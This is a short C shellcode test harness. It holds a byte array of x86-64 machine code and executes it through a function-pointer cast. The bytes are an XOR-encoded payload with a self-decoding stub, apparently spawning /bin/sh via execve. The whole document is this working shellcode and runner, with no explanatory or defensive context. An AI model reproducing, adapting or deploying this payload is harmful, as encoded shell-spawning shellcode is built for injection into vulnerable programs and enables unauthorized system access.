#include <stdio.h>
unsigned char shellcode[] = \
 "\xeb\x22\x48\x31\xdb\xb3\x55\x48\x31\xd2\xb2\x1b\x5f\x48\x89\xd1\x48\xff\xc1\x48\x31\xc0\x8a\x44\x0f\xff\x30\xd8\x88\x44\x0f\xff\xe2\xf4\xeb\x05\xe8\xd9\xff\xff\xff\x64\x95\x1d\xee\x84\xc8\xc3\xc4\x85\xd9\xc2\xaa\x1d\xa2\x8e\x06\x01\x0a\xcc\x07\x02\x01\x0b\xe5\x6e\x5a\x50";

main()
{
        int (*ret)() = (int(*)())shellcode;
            ret();
}
